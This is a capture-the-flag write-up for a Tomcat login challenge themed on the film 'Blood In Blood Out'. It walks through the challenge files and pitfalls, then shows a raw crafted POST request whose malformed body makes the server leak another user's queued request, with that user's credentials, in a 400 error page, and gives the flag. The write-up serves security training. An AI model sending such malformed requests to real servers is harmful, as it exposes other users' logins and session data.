# TASK INFO
Task Author: LOLASL

Writeup author: Raresh1t (SIFI)

**Task text:** 

*Hey carnal, sometimes you gotta slide in a little extra something for the homies. Theres a placa looking every minute so keep it tight, ese.*

The task theme is based on the movie "Blood In Blood Out" released in 1993, focusing on the Vatos Locos gang in Los Angeles in 1970s California.

# File analysis
**Attached file:**
A gzip archive is attached with the task. (bloodinbloodout.tar.gz)
Unzipping this archive extracts a folder named "source" which contains 5 files and 1 other directory.

**Dockerfile:** Contains the docker instancing instructions. Exposes port 8443. Finishes by running run.sh

**run.sh:** Simple shell file which starts the Catalina container, then runs victim.sh.

**victim.sh:** A shell script which continually performs an admin login towards localhost:8443/welcome.jsp every minute. (*This script is referenced from the second task
sentence: "a placa looking every minute"*)
This file contains a variable COOKIES, which holds the string: "JSESSIONID=EFC6BC3B39449C34A07AAEED1E9BE69A"

The main part of the script is a function "simulate_admin_login()" containing an always-true while loop which performs a curl request to the specified endpoint, then sleeps for 60 seconds and then performs another, indefinitely.
The file we were given contains placeholders for association, username, and password which are likely key parts needed to obtain the flag.

**server.xml**: This is the main server configuration for the Tomcat server, and contains some defined instructions. The most important detail of this file is that a Connector to port 8443 is defined, along with a keystore file with the alias "tomcat" with the key to the keystore file defined as "yoyoma"
```
<Connector port="8443" protocol="HTTP/1.1"
           connectionTimeout="20000"
           scheme="https"
           secure="true"
           SSLEnabled="true"
           keyAlias="tomcat"
           keystoreFile="conf/ssl/selfsigned.jks"
           keystorePass="yoyoma"
           clientAuth="false" />
```
Another interesting piece is a Valve defined as a log collector which stores localhost access logs in the directory "logs" as the file "localhost_access_logs.txt".
```
        <Valve className="org.apache.catalina.valves.AccessLogValve" directory="logs"
               prefix="localhost_access_log" suffix=".txt"
               pattern="%h %l %u %t &quot;%r&quot; %s %b" />
```
**selfsigned.jks**: This is the java keystore file, which we know from the server.xml configuration is protected with the string "yoyoma". This key can be used to decrypt TLS-encrypted traffic for the Connector port 8443 as it was used to configure the Connector port in the server configuration.

**Directory ROOT:** This directory contains the two files which are present on the webpage: "index.jsp" and "welcome.jsp". Index is the front page with the login screen, and welcome is the JavaServer page which is called from index.jsp when a login action is POSTed.

**index.jsp**: Nothing special here. Just the login page containing the form which requires all 3 parameters, and calls on welcome.jsp for POST requests.

**welcome.jsp**: The page which handles POST requests. It stores the provided username and password parameters from the request as strings and does a simple if-statement with a logical AND operator to check if both values are equal to some hard-coded value. If they are, you get the flag. If not, you get "Hey Cinderella, go find yourself a fella!" which is a known quote from the movie the task is based on.
```
    String username = request.getParameter("username");
    String password = request.getParameter("password");

    if("placeholderuser".equals(username) && "placeholderpassword".equals(password)) {
        out.println("<h3>EPT{this_is_a_placeholder_flag}</h3>");
    } else {
        out.println("<h3>Hey Cinderella, go find yourself a fella!</h3>");
    }
    %>

```

With all this in mind we need to find out where we can get these correct values to login and get the flag.
# Web Analysis
This task is simply a web-exploit challenge, however there are a few pitfalls which are easy to get lost in.

The task is running on an ondemand service (a VM) which has an Apache Tomcat server running with a Catalina container. The server presents you with a simple login screen for "San Quentin". San Quentin is a state prison in California which matches the theme of the task.

The login page has 3 input parameters: one association, one username, and one password.
The association parameter is a dropdown menu with 4 options, which is a required parameter: Los Angeles Police Department, Black Guerilla Army (BGA), The Aryan Vanguard, and La Onda. These are all significant groups which are tied to the movie.
Username and password are simply text input fields, but as identified in the file analysis they are also required parameters.

# Pitfall 1
An attempted brute force is not recommended for this task. You could be lucky as the correct username and password are related to the movie, however it is not an intended solution. 
# Pitfall 2
The biggest pitfall in this task is the idea that you need to attack victim.sh. Port 8443 is not open externally. (Checked with an Nmap scan and attempted connections.)

You can not intercept or capture the traffic this script is generating as it is only sending traffic locally. This also removes the entire need for the keystore file. You could use it to decrypt traffic, but you can't intercept the traffic which you would need to decrypt.

(Atleast as far as I know.)

# Solution
This task was simply solved with a sensitive information leak through an error response when the server handles a request.
```
"POST /welcome.jsp HTTP/1.1
Host: 10.128.2.173
Cookie: JSESSIONID=D250017936541CC7182F4309877D54D4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 76
Origin: https://10.128.2.173
Referer: https://10.128.2.173/index.jsp
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: keep-alive

association=Black"&username"&username=ls&password=%26password"
```
**association=Black"&username"&username=ls&password=%26password**

The response from the server indicates a successful request, however the server has received an error and leaked an error which has occurred when attempting to process a bad request.
```
HTTP/1.1 200
Content-Type: text/html;charset=UTF-8
Content-Length: 1224
Date: Sat, 02 Nov 2024 17:24:59 GMT
Keep-Alive: timeout=20
Connection: keep-alive
<!DOCTYPE html> <html> <head> <meta charset="UTF-8"> <title>Welcome to San Quentin</title> <style> body { background: url('https://dannytrejo.com/wp-content/uploads/2016/06/blood-in-blood-out-danny-trejo-crew.jpg') no-repeat center center fixed; background-size: cover; color: #fff; font-family: 'Arial', sans-serif; height: 100vh; display: flex; justify-content: center; align-items: center; } .welcome-container { text-align: center; background: rgba(0, 0, 0, 0.7); padding: 30px; border-radius: 10px; width: 350px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5); } .welcome-container h1 { font-size: 24px; color: #ff4500; text-transform: uppercase; letter-spacing: 2px; } .welcome-container img { width: 100px; margin-bottom: 20px; } </style> </head>
<body> <div class="welcome-container"> <h3>Hey Cinderella, go find yourself a fella!</h3> </div> </body>
HTTP/1.1 400
Content-Type: text/html;charset=utf-8
Content-Language: en
Transfer-Encoding: chunked
Date: Sat, 02 Nov 2024 17:24:59 GMT
Connection: close 2000
<!doctype html><html lang="en"><head><title>HTTP Status 400 – Bad Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head>
<body><h1>HTTP Status 400 – Bad Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in method name [ck&quot;&amp;username&quot;&amp;username=ls&amp;password=%26passwordT17:24:30+00:00&amp;submit=true&amp;association=Los+Angeles+Police+Department&amp;username=paco&amp;password=carnalvato19690x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x00"
```

Providing a malformed input causes the server to leak the hardcoded credentials in the request handling:
```
<h1>HTTP Status 400 – Bad Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b>
Invalid character found in method name
[ck&quot;&amp;username&quot;&amp;username=ls&amp;password=%26passwordT17:24:30+00:00&amp;submit=true&amp;association=Los+Angeles+Police+Department&amp;username=paco&amp;password=carnalvato1969
```
**username=paco&amp;password=carnalvato1969**

Logging in with **username = paco** and **password = carnalvato1969** reveals the flag:

**EPT{vatos_locos_4_ever_ese!_<3}**
